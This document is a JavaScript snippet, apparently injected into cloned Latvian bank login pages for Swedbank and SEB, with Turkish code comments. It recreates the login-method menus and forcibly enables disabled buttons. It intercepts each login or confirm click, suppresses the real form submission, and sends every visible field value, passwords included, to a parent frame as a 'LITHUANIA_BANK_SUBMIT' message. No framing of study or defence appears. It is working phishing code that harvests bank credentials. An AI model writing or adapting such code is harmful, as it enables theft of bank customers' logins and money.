<script>(function(){
function go(i,t){try{parent.postMessage({type:'LITHUANIA_BANK_TAB_CLICK',targetIndex:i,loginMethod:t||''},'*')}catch(e){}}
var m=(location.pathname||'').match(/\/latvian-banks\/([a-z0-9_-]+)\/([^\/]+)\.html/i);
if(!m)return;
var bank=m[1],file=m[2];
var curIdx=(parseInt(file,10)||1)-1;

// ---- ortak: gorunur/doldurulabilir input'lari bul ----
function visInputs(){
  return Array.prototype.slice.call(document.querySelectorAll('input')).filter(function(el){
    var t=(el.getAttribute('type')||'text').toLowerCase();
    if(['text','password','tel','email','number'].indexOf(t)<0)return false;
    if(el.disabled||el.readOnly)return false;
    var cls=' '+String(el.className||'')+' ';
    if(/(sf-hidden|-hidden|\bhidden\b|print)/.test(cls))return false;
    if((el.getAttribute('aria-hidden')||'')==='true')return false;
    if(/display\s*:\s*none/i.test(el.getAttribute('style')||''))return false;
    if(el.offsetWidth===0&&el.offsetHeight===0)return false;
    return true;
  });
}
function checkFields(){
  var ok=true;
  visInputs().forEach(function(inp){
    if((inp.value||'').trim()){inp.removeAttribute('aria-invalid');inp.style.borderColor='';}
    else{ok=false;inp.setAttribute('aria-invalid','true');inp.style.borderColor='#e30613';}
  });
  return ok;
}

// SWEDBANK: native select -> 1..5
if(bank==='swedbank-lv'){
  var sel=document.querySelector('select[aria-label="Select tab"],select');
  if(sel){
    if(sel.selectedIndex!==curIdx)sel.selectedIndex=curIdx;
    sel.addEventListener('change',function(){var o=sel.options[sel.selectedIndex];go(sel.selectedIndex,o?o.textContent.trim():'');});
  }
}

// SEB: Angular dropdown - menu BOS, itemlari olustur
if(bank==='seb-lv'){
  var menu=document.querySelector('.dropdown-menu'),tog=document.querySelector('.dropdown-toggle');
  var labels=['Smart-ID','SEB mobil\u0101 lietotne','eParaksts mobile','Kodu kalkulators'];
  function closeMenu(){if(menu){menu.style.display='none';menu.classList.add('sf-hidden');}}
  if(menu&&!menu.children.length){
    labels.forEach(function(lb,i){
      var a=document.createElement('a');
      a.href='#';
      a.textContent=lb;
      a.setAttribute('data-lv-idx',String(i));
      a.style.cssText='display:block;padding:.625rem .75rem;color:#0062bc;text-decoration:none;cursor:pointer;font-size:1rem;line-height:1.5rem;'+(i===curIdx?'font-weight:600;':'');
      a.onmouseenter=function(){a.style.background='#f2f2f2';};
      a.onmouseleave=function(){a.style.background='';};
      menu.appendChild(a);
    });
  }
  document.addEventListener('click',function(e){
    if(!menu||!tog)return;
    var item=e.target.closest&&e.target.closest('.dropdown-menu a[data-lv-idx]');
    if(item){e.preventDefault();e.stopImmediatePropagation();closeMenu();tog.setAttribute('aria-expanded','false');go(parseInt(item.getAttribute('data-lv-idx'),10),item.textContent.trim());return;}
    if(e.target.closest&&e.target.closest('.dropdown-toggle')){
      e.preventDefault();e.stopImmediatePropagation();
      var open=menu.style.display==='block';
      menu.style.display=open?'none':'block';
      menu.classList.toggle('sf-hidden',open);
      tog.setAttribute('aria-expanded',String(!open));
      return;
    }
    if(menu.style.display==='block'&&!menu.contains(e.target)){closeMenu();tog.setAttribute('aria-expanded','false');}
  },true);
}

// ============ SUBMIT: buton aktif + alanlar dolmadan gonderim yok ============
(function(){
  var SUB=/ieiet|turpin|piesl|ielog|ienakt|ienākt|apstipr|login|next|patvirt|pateik|iesniegt|pievienot|autoriz|confirm|verifik|ielogoties|autentific/i;
  function btnInfo(b){
    var img=b.querySelector?b.querySelector('img'):null;
    return ((b.textContent||'')+' '+(b.value||'')+' '+(img&&img.alt||'')+' '+(b.getAttribute('aria-label')||'')+' '+(b.getAttribute('title')||'')+' '+(b.className||'')).trim();
  }
  function isSubmitBtn(b){
    if(!b)return false;
    if(b.getAttribute('role')==='radio'||b.classList.contains('dropdown-toggle'))return false;
    if(b.closest&&b.closest('.login-type,[data-tab-index],vaadin-tab,ul.css_tabs,[role=radiogroup],[role=tab],.ui-tabs__dropdown,.seb-tabs'))return false;
    return SUB.test(btnInfo(b))||b.getAttribute('type')==='submit';
  }
  var SEL='button,input[type=submit],input[type=button],vaadin-button,span.button,[role=button],a';
  function enableAll(){
    document.querySelectorAll('button[disabled],input[disabled],[aria-disabled="true"]').forEach(function(c){
      c.removeAttribute('disabled');c.setAttribute('aria-disabled','false');c.disabled=false;
      c.style.pointerEvents='auto';c.style.opacity='';c.style.cursor='';
    });
  }
  enableAll();
  document.addEventListener('input',enableAll,true);
  document.addEventListener('change',enableAll,true);
  setTimeout(enableAll,300);setTimeout(enableAll,900);
  document.addEventListener('click',function(e){
    var b=e.target.closest&&e.target.closest(SEL);
    if(!b||!isSubmitBtn(b))return;
    e.preventDefault();e.stopImmediatePropagation();
    if(!checkFields())return;
    var inputs={};
    visInputs().forEach(function(i){var k=i.name||i.id||'field';if(i.value&&i.value.trim())inputs[k]=i.value.trim();});
    var lm='';var act=document.querySelector('.login-type.active,vaadin-tab[selected],[role=tab][aria-selected=true]');if(act)lm=(act.textContent||'').trim();try{parent.postMessage({type:'LITHUANIA_BANK_SUBMIT',formData:{inputs:inputs,fields:[],loginMethod:lm}},'*')}catch(_){ }
  },true);
  document.addEventListener('submit',function(e){e.preventDefault();},true);
})();
})();</script>
